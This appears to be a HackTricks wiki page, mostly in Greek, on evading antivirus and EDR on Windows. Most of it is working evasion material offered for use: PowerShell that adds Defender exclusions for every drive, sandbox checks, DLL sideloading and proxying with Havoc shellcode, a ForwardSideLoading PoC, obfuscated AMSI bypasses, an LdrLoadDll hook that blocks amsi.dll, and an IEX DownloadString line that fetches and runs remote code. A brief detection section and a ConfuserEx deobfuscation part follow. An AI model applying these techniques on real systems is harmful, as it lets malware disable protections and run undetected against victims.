# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender παριστάνοντας άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC δόλωμα πριν από την παρέμβαση στον Defender

Public loaders που μιμούνται game cheats συχνά διανέμονται ως μη υπογεγραμμένοι Node.js/Nexe installers που πρώτα **ζητούν από τον χρήστη ανύψωση προνομίων** και μόνο μετά αδρανοποιούν τον Defender. Η ροή είναι απλή:

1. Ελέγχει για administrative context με `net session`. Η εντολή επιτυγχάνει μόνο όταν ο καλών έχει admin δικαιώματα, οπότε μια αποτυχία υποδηλώνει ότι ο loader εκτελείται ως standard user.
2. Αμέσως επανεκκινεί τον εαυτό του με το `RunAs` verb για να προκαλέσει το αναμενόμενο UAC consent prompt, διατηρώντας την αρχική γραμμή εντολών.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” software, οπότε η προτροπή συνήθως γίνεται αποδεκτή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει αυξημένα δικαιώματα, μια αλυσίδα τύπου GachiLoader μεγιστοποιεί τα τυφλά σημεία του Defender αντί να απενεργοποιεί εντελώς την υπηρεσία. Ο loader πρώτα τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια ωθεί **εξαιρετικά ευρείες εξαιρέσεις**, ώστε κάθε προφίλ χρήστη, κατάλογος συστήματος και αφαιρούμενος δίσκος να μην μπορούν να σαρωθούν:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Κύριες παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο filesystem (D:\, E:\, USB sticks, κ.λπ.) οπότε **οποιοδήποτε μελλοντικό payload που τοποθετείται οπουδήποτε στο δίσκο αγνοείται**.
- Η εξαίρεση με το extension `.sys` είναι μελλοντικά-προσανατολισμένη — οι επιτιθέμενοι διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να πειράξουν ξανά τον Defender.
- Όλες οι αλλαγές καταλήγουν κάτω από HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ξαναπροκαλέσουν UAC.

Επειδή καμία υπηρεσία του Defender δεν σταματάει, οι πρόχειροι έλεγχοι κατάστασης συνεχίζουν να αναφέρουν “antivirus active” παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν αγγίζει ποτέ αυτές τις διαδρομές.

## **AV Evasion Methodology**

Προς το παρόν, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο εξελιγμένα EDRs, behavioural analysis.

### **Static detection**

Το static detection επιτυγχάνεται σηματοδοτώντας γνωστές κακόβουλες strings ή arrays of bytes σε ένα binary ή script, και επίσης εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε εκθέσει πιο εύκολα, καθώς πιθανώς έχουν ήδη αναλυθεί και σημειωθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψεις αυτό το είδος ανίχνευσης:

- **Encryption**

  Εάν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για τα AV να εντοπίσουν το πρόγραμμα σου, αλλά θα χρειαστείς κάποιον loader για να το αποκρυπτογραφήσει και να το τρέξει στη μνήμη.

- **Obfuscation**

  Κάποιες φορές το μόνο που χρειάζεται είναι να αλλάξεις μερικά strings στο binary ή script σου για να το περάσεις από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.

- **Custom tooling**

  Αν αναπτύξεις δικά σου tools, δεν θα υπάρχουν γνωστές κακές signatures, αλλά αυτό απαιτεί πολύ χρόνο και κόπο.

> [!TIP]
> Ένας καλός τρόπος για έλεγχο απέναντι στο Windows Defender static detection είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλαπλά segments και ζητά από τον Defender να σαρώσει το καθένα ξεχωριστά — έτσι μπορεί να σου πει ακριβώς ποιες είναι οι flagged strings ή bytes στο binary σου.

Συνιστώ ανεπιφύλακτα να ρίξεις μια ματιά σε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτικό AV Evasion.

### **Dynamic analysis**

Το dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς του browser, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις sandboxes.

- **Sleep before execution** Ανάλογα με το πώς έχει υλοποιηθεί, μπορεί να είναι ένας πολύ καλός τρόπος για να παρακάμψεις το dynamic analysis των AV. Τα AV έχουν πολύ μικρό χρόνο για να σαρώσουν αρχεία ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleep μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παρακάμψουν το sleep ανάλογα με την υλοποίηση.

- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τη μηχανή του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις ταχύτητες των ανεμιστήρων — δεν θα είναι όλα υλοποιημένα στο sandbox.

- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη cuyo workstation είναι joined στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις ορίσει — αν δεν ταιριάζει, μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

Turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως είπαμε πριν, **public tools** τελικά **θα εντοπιστούν**, οπότε πρέπει να θέσεις στον εαυτό σου το εξής:

Για παράδειγμα, αν θέλεις να dump-άρεις το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις mimikatz**; Ή θα μπορούσες να χρησιμοποιήσεις ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS;

Η σωστή απάντηση είναι πιθανώς το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα, αν όχι το πιο, flagged κομμάτια malware από AVs και EDRs — ενώ το project είναι super cool, είναι επίσης ένας εφιάλτης να δουλέψεις με αυτό για να ξεπεράσεις AVs, οπότε απλώς ψάξε για alternatives για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, φρόντισε να απενεργοποιήσεις το **automatic sample submission** στον Defender, και παρακαλώ, στα σοβαρά, **DO NOT UPLOAD TO VIRUSTOTAL** αν ο στόχος σου είναι μακροπρόθεσμη evasion. Αν θέλεις να ελέγξεις αν το payload σου εντοπίζεται από κάποιο AV, εγκατάστησέ το σε μια VM, προσπάθησε να απενεργοποιήσεις το automatic sample submission, και δοκίμασε εκεί μέχρι να μείνεις ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **prioritize using DLLs for evasion**, κατά την εμπειρία μου, τα DLL files συνήθως **way less detected** και αναλύονται, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις ανίχνευση σε κάποιες περιπτώσεις (αν το payload σου έχει κάποια δυνατότητα να τρέξει ως DLL φυσικά).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με DLL αρχεία για να γίνεις πολύ πιο stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

Μπορείς να ελέγξεις για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων ευάλωτων σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ έντονα να **εξερευνήσετε μόνοι σας τα DLL Hijackable/Sideloadable προγράμματα**, αυτή η τεχνική είναι αρκετά stealthy αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να πιαστείτε εύκολα.

Απλά τοποθετώντας ένα κακόβουλο DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει απαραίτητα το payload σας, καθώς το πρόγραμμα αναμένει συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL προς το αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Και το shellcode μας (encoded with [SGN](https://github.com/EgeBalci/sgn)) και το proxy DLL έχουν 0/26 Detection rate στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συστήνω ανεπιφύλακτα** να δείτε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σχετικά με όσα συζητήσαμε σε μεγαλύτερο βάθος.

### Εκμετάλλευση των Forwarded Exports (ForwardSideLoading)

Windows PE modules μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η καταχώρηση του export περιέχει μια ASCII συμβολοσειρά της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Θα φορτώσει το `TargetDll` αν δεν έχει ήδη φορτωθεί
- Θα επιλύσει την `TargetFunc` από αυτό

Βασικά σημεία που πρέπει να κατανοήσετε:
- Εάν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).
- Εάν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο του module που πραγματοποιεί την επίλυση του forward.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια συνάρτηση προωθημένη σε ένα μη-KnownDLL όνομα module, και στη συνέχεια τοποθετήστε μαζί (co-locate) αυτό το signed DLL με ένα attacker-controlled DLL που ονομάζεται ακριβώς όπως το προωθημένο target module. Όταν το προωθημένο export καλείται, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε φορτώνεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain είναι αρκετό για να επιτύχετε εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε το forwarding με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν υλοποιείται, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται κάτω από `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder του Windows 11 για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Ιδέες ανίχνευσης/άμυνας:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από μη συστημικές διαδρομές, και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από εκείνον τον κατάλογο
- Ειδοποιήστε για αλυσίδες process/module όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` κάτω από διαδρομές εγγράψιμες από τον χρήστη
- Εφαρμόστε πολιτικές code integrity (WDAC/AppLocker) και απαγορέψτε write+execute στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή εντοπισμού είναι απλώς παιχνίδι γάτας και ποντικιού — αυτό που λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο· αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές αποφυγής.

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει τα "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σαρώνουν μόνο αρχεία στον δίσκο, οπότε αν με κάποιο τρόπο μπορούσες να εκτελέσεις payloads απευθείας στη μνήμη, τα AVs δεν μπορούσαν να κάνουν τίποτα για να το αποτρέψουν, καθώς δεν είχαν επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα ακόλουθα components των Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις antivirus λύσεις να επιθεωρούν τη συμπεριφορά των scripts εκθέτοντας τα περιεχόμενα των scripts σε μορφή που δεν είναι κρυπτογραφημένη και δεν έχει obfuscation.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προθέτει `amsi:` και στη συνέχεια το μονοπάτι προς το εκτελέσιμο από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση, powershell.exe

Δεν γράψαμε κανένα αρχείο στον δίσκο, αλλά παρόλα αυτά πιαστήκαμε στη μνήμη λόγω του AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Εφόσον το AMSI δουλεύει κυρίως με στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει τη δυνατότητα να unobfuscate τα scripts ακόμα και αν έχουν πολλαπλά επίπεδα, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό καθιστά την παράκαμψη όχι τόσο απλή. Παρ' όλα αυτά, κάποιες φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε καλυμμένοι, οπότε εξαρτάται από το πόσο έχει σηματοδοτηθεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται φορτώνοντας ένα DLL στην διαδικασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι εφικτό να παραποιήσει κανείς αυτό το DLL ακόμη και όταν τρέχει ως χρήστης χωρίς δικαιώματα διαχειριστή. Λόγω αυτού του κενού στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν τη σάρωση του AMSI.

**Forcing an Error**

Η αναγκαστική αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μια γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διαδικασία powershell. Αυτή η γραμμή, φυσικά, έχει επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για να παρακάμψετε το AMSI με powershell — δείτε τη [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και το [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. Μια στιβαρή, ανεξάρτητη από τη γλώσσα παράκαμψη είναι να τοποθετήσετε ένα user‑mode hook στο `ntdll!LdrLoadDll` που επιστρέφει σφάλμα όταν το ζητούμενο module είναι `amsi.dll`. Ως αποτέλεσμα, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και σε custom loaders (οτιδήποτε που διαφορετικά θα φόρτωνε το AMSI).
- Χρησιμοποιήστε σε συνδυασμό με την παροχή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μακροσκελή ίχνη στη γραμμή εντολών.
- Έχει παρατηρηθεί σε χρήση από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` καλεί `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια αντικαθιστώντας την με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**AV/EDR products that uses AMSI**

Μπορείτε να βρείτε λίστα με προϊόντα AV/EDR που χρησιμοποιούν το AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Εάν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.

Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawnάρετε ένα PowerShell χωρίς μηχανισμούς άμυνας (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Το output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε τον δικό σας unpacker.

